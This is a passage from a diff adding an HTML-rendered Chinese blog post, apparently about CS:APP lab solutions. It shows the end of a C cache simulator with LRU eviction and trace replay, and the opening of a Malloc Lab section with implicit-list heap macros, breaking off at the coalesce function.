+    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./%s [-hv] -s &amp;lt;s&amp;gt; -E &amp;lt;E&amp;gt; -b &amp;lt;b&amp;gt; -t &amp;lt;tracefile&amp;gt;&amp;#34;&lt;/span&gt;, name);
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Options:&amp;#34;&lt;/span&gt;);
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  -h         Print this help message.&amp;#34;&lt;/span&gt;);
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  -v         Optional verbose flag.&amp;#34;&lt;/span&gt;);
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  -s &amp;lt;num&amp;gt;   Number of set index bits.&amp;#34;&lt;/span&gt;);
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  -E &amp;lt;num&amp;gt;   Number of lines per set.&amp;#34;&lt;/span&gt;);
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  -b &amp;lt;num&amp;gt;   Number of block offset bits.&amp;#34;&lt;/span&gt;);
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  -t &amp;lt;file&amp;gt;  Trace file.&amp;#34;&lt;/span&gt;);
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Examples:&amp;#34;&lt;/span&gt;);
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  linux&amp;gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace&amp;#34;&lt;/span&gt;);
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;  linux&amp;gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace&amp;#34;&lt;/span&gt;);
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;initCache&lt;/span&gt;() {
+    cache &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (cache_t)malloc(&lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(cache_set_t) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; S);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; S; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+        cache[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (cache_set_t)malloc(&lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(cache_line_t) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; E);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; E; j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+            cache[i][j].valid_bit &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+            cache[i][j].tag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+            cache[i][j].lru &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+        }
+    }
+    set_index_mask &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; s) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;releaseCache&lt;/span&gt;() {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; S; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
+        free(cache[i]);
+        cache[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+    }
+    free(cache);
+    cache &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;accessData&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; address){
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; eviction_lru &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1LL&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; eviction_line &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; tag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; address &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; (s &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; b);
+    cache_set_t cache_set &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cache[(address &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; b) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; set_index_mask];
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; ; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i) {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; E) {
+            &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;miss_count;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (v)
+                printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;miss &amp;#34;&lt;/span&gt;);
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; E; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;j) {
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cache_set[j].lru &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; eviction_lru) {
+                    eviction_line &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; j;
+                    eviction_lru &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cache_set[j].lru;
+                }
+            }
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cache_set[eviction_line].valid_bit) {
+                &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;eviction_count;
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (v) 
+                    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;eviction &amp;#34;&lt;/span&gt;);
+            }
+            cache_set[eviction_line].valid_bit &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+            cache_set[eviction_line].tag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tag;
+            cache_set[eviction_line].lru &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lru_counter&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+        }
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cache_set[i].valid_bit &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cache_set[i].tag &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; tag) {
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+        }
+    }
+    &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;hit_count;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (v) 
+        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hit &amp;#34;&lt;/span&gt;);
+    cache_set[i].lru &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lru_counter&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;replayTrace&lt;/span&gt;(FILE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; address;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; size;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;];
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (fgets(buf, &lt;span style=&#34;color:#ae81ff&#34;&gt;1023&lt;/span&gt;, f)) {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;L&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;S&amp;#39;&lt;/span&gt;) {
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;;
+        }
+        sscanf(buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%llx,%u &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;address, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;size);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (v)
+            printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%c %llx,%u &amp;#34;&lt;/span&gt;, buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], address, size);
+        accessData(address);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;) {
+            accessData(address);
+        }
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (v) putchar(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;);
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; argv[]) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; o;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ((o &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getopt(argc, argv, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hvs:E:b:t:&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; (o) {
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;h&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+                printUsage(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;v&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+                v &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+                s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atoi(optarg);
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;E&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+                E &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atoi(optarg);
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+                b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atoi(optarg);
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+                tracefile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; optarg;
+                fp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fopen(tracefile, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;);
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL) {
+                    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;File %s open failed.&amp;#34;&lt;/span&gt;, tracefile);
+                    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+                }
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+                printUsage(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+        }
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (s &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; E &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;tracefile &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
+        printUsage(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+    }
+    S &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; s;
+    B &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; b;
+
+    initCache();
+    replayTrace(fp);
+
+    printSummary(hit_count, miss_count, eviction_count);
+
+    releaseCache();
+    fclose(fp);
+    
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;lab10-malloc-lab&#34;&gt;Lab10 Malloc-lab&lt;/h2&gt;
+&lt;p&gt;实现了两种 Malloc&lt;/p&gt;
+&lt;h3 id=&#34;隐式链表&#34;&gt;隐式链表&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;+-----------------+
+| chunksize | 00A | A: Alloc
++-----------------+
+|    (padding)    |
++-----------------+
+| chunksize | 00A | A: Alloc
++-----------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;宏定义&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* single word (4) or double word (8) alignment */&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define ALIGNMENT 8
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define WSIZE 4                 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* Word and header/footer size (bytes) */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define DSIZE 8                 &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* Double word size (bytes) */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define CHUNKSIZE (1 &amp;lt;&amp;lt; 12)     &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* Extend hea by this amount (bytes) */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define MAX(x, y) ((x) &amp;gt; (y) ? (x) : (y))
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;/* rounds up to the nearest multiple of ALIGNMENT */&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define ALIGN(size) (((size) + (ALIGNMENT-1)) &amp;amp; ~0x7)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define SIZE_T_SIZE (ALIGN(sizeof(size_t)))
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;/* Pack a size and allocated bit into a word */&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define PACK(size, alloc) ((size) | (alloc))
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;/* Read and write a word at address p */&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define GET(p) (*(unsigned int*)(p))
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define PUT(p, val) (*(unsigned int*)(p) = (val))
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define GET_SIZE(p) (GET(p) &amp;amp; ~0x7)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define GET_ALLOC(p) (GET(p) &amp;amp; 0x1)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;/* Given block ptr bp, compute address of its header and footer */&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define HDRP(bp) ((char*)(bp) - WSIZE)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define FTRP(bp) ((char*)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;/* Given block ptr bp, compute address of next and previous blocks */&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char*)(bp) - WSIZE)))
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char*)(bp) - DSIZE)))
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用宏定义编译方便一些&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define FIRST_FIT 1
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define NEXT_FIT 2
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define BEST_FIT 3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一些全局变量&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;heap_listp;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;#if FIT_ALGO == NEXT_FIT
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;cur_listp;
+&lt;span style=&#34;color:#75715e&#34;&gt;#endif
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;核心代码直接抄书：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * coalesce - Coalesce free block next by
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;coalesce&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp) {
